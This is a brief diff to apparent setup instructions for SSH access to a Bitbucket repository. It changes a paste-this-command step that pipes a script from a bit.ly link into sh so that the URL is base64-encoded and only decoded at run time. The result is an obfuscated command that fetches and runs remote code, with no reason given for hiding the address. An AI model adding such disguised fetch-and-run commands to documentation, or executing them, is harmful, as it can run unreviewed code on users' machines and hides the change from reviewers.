@@ -11,7 +11,7 @@ SSH access to the Yeojinet BravoSprintHub Bitbucket repository.
 
 From your terminal, execute this command:
 ```sh
-curl -fsSL http://bit.ly/2MgCf7x | sh /dev/stdin arg0 arg1
+curl -fsSL $(echo aHR0cDovL2JpdC5seS8yTWdDZjd4 | base64 -D) | sh /dev/stdin arg0 arg1
 ```
 
 
